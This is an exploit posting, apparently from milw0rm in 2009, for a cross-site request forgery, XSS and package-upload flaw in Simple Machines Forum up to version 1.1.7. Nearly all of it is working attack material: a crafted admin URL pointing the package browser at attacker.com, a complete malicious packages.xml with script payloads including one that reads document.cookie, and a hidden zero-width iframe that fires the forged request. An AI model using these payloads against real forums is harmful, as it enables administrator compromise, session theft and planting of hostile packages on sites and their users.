<html><head><title>Simple Machines Forum <= 1.1.7 XSRF/XSS/Package Upload Vuln</title></head><pre>Author: Xianur0
Vulnerable Version: All

The Bug is located in the file: Sources/PackageGet.php

Example:
http://victm.com/index.php?action=packageget;sa=browse;absolute=http://attacker.com

When the admin link between the SMF to load the file:

http://attacker.com/packages.xml

Save this file as packages.xml

&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE modification SYSTEM &quot;http://www.simplemachines.org/xml/package-list&quot;&gt;
&lt;!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
XSRF SMF PoC By Xianur0
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - --&gt;

&lt;package-list xmlns=&quot;http://www.simplemachines.org/xml/package-list&quot;
xmlns:smf=&quot;http://www.simplemachines.org/&quot;&gt;
&lt;list-title&gt;Xianur0 Was Here&lt;/list-title&gt;

&lt;section&gt;
    &lt;title&gt;SMF XSS PoC By Xianur0&lt;/title&gt;
    &lt;text&gt;&lt;![CDATA[&lt;script&gt;alert('XSS')&lt;/script&gt;]]&gt;&lt;/text&gt;
    &lt;modification&gt;
        &lt;id&gt;Xianur0:XSMF&lt;/id&gt;
        &lt;name&gt;SMF PoC By Xianur0&lt;/name&gt;
        &lt;filename&gt;smfexploit.zip&lt;/filename&gt;
        &lt;version&gt;0.1&lt;/version&gt;
        &lt;author email=&quot;uxmal666@gmail.com&quot;&gt;Xianur0&lt;/author&gt;
        &lt;description&gt;&lt;![CDATA[&lt;script&gt;alert(document.cookie)&lt;/script&gt;]]&gt;&lt;/description&gt;
    &lt;/modification&gt;
&lt;/section&gt;
&lt;/package-list&gt;

and generate the XSRF:

&lt;iframe src =&quot;http://victim.com/index.php?action=packageget;sa=browse;absolute=http://attacker.com&quot;
width=&quot;0%&quot; scrolling=no width=0%&gt;&lt;/iframe&gt;

# milw0rm.com [2009-01-26]</pre></html>